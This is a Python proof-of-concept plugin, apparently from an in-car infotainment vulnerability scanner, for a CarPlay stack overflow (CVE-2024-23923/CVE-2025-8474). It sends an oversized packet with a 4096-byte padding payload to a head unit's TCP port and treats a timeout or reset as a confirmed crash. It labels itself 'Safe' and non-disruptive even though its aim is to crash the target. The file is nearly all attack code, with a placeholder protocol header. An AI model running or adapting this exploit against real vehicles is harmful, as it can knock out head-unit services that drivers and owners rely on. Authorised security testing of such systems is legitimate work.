#!/usr/bin/env python3
"""
PoC Name: CarPlay Protocol Stack Overflow
CVE: CVE-2024-23923
Component: Application Stack
Category: Application
Severity: High
CVSS: 7.5
Description: 超大CarPlay协议数据包触发头单元栈溢出
Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
Usage: python3 03_CVE_2024_23923_CarPlay_Stack_Overflow_Active_Validation.py <target_ip>
"""
from __future__ import annotations

import socket
import struct
import sys
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id":             0,
    "cve":            "CVE-2024-23923,CVE-2025-8474",
    "year":           2024,
    "domain":         "application",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "CarPlay Stack Overflow",
    "source_url":     "https://nvd.nist.gov/vuln/detail/CVE-2024-23923",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://nvd.nist.gov/vuln/detail/CVE-2024-23923"],
    "signature_tokens": ["CVE-2024-23923,CVE-2025-8474"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CVE-2024-23923,CVE-2025-8474 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CVE-2024-23923,CVE-2025-8474") if vuln else "CVE-2024-23923,CVE-2025-8474",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class AlpineCarPlayPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-003"
    """
    CVE-2025-8474: Alpine iLX-507 CarPlay Stack Overflow POC
    """
    meta_poc_name = 'CVE-2024-23923 CarPlay 栈溢出 Active Validation'
    meta_cve_id = "CVE-2024-23923,CVE-2025-8474"
    meta_source_url = "https://nvd.nist.gov/vuln/detail/CVE-2024-23923"
    meta_references = ['https://nvd.nist.gov/vuln/detail/CVE-2024-23923', 'https://nvd.nist.gov/vuln/detail/CVE-2025-8474']
    meta_severity = "High"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    meta_profiles         = ["application"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    
    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "CVE-2024-23923,CVE-2025-8474"
        self.results["description"] = "Alpine CarPlay Protocol Stack Overflow"
        self.target_port = 55555 # 典型 CarPlay 控制端口，需根据实际扫描结果调整

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需指定目标IP")
            return False
        return True

    def exploit(self):
        self.logger.info(f"连接目标 {self.target_ip}:{self.target_port}...")
        
        # 伪造 CarPlay 协议头 (简化版)
        # Magic (4B) | Type (2B) | Length (2B)
        magic = b'\x4F\x50\x4C\x59' # 示例 Magic
        msg_type = b'\x00\x01' # Info Exchange
        
        # 构造溢出 Payload
        # 漏洞点：未校验 Payload 长度
        overflow_data = b"A" * 4096 # 远超典型栈缓冲区
        length = struct.pack('>H', len(overflow_data))
        
        packet = magic + msg_type + length + overflow_data
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # 设置短超时，因为如果崩溃可能没有回包
            s.settimeout(3)
            s.connect((self.target_ip, self.target_port))
            
            self.logger.info("发送 CarPlay 溢出数据包...")
            s.send(packet)
            
            try:
                resp = s.recv(1024)
                self.logger.info("收到响应，目标似乎未崩溃。")
                self.results["vulnerable"] = False
            except socket.timeout:
                self.logger.warning("接收超时，目标可能已死锁。")
                self.results["vulnerable"] = True
                self.results["evidence"] = "Target unresponsive after payload."
            except ConnectionResetError:
                self.logger.warning("连接被重置，目标服务可能崩溃。")
                self.results["vulnerable"] = True
                self.results["evidence"] = "Connection reset by peer (Crash)."
            
            s.close()
            
        except ConnectionRefusedError:
            self.logger.error("连接被拒绝，端口未开放。")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"Exploit failed: {e}")
            self.results["vulnerable"] = False
            
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 03_CVE_2024_23923_CarPlay_Stack_Overflow_Active_Validation.py <target_ip>")
        sys.exit(1)
    plugin = AlpineCarPlayPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
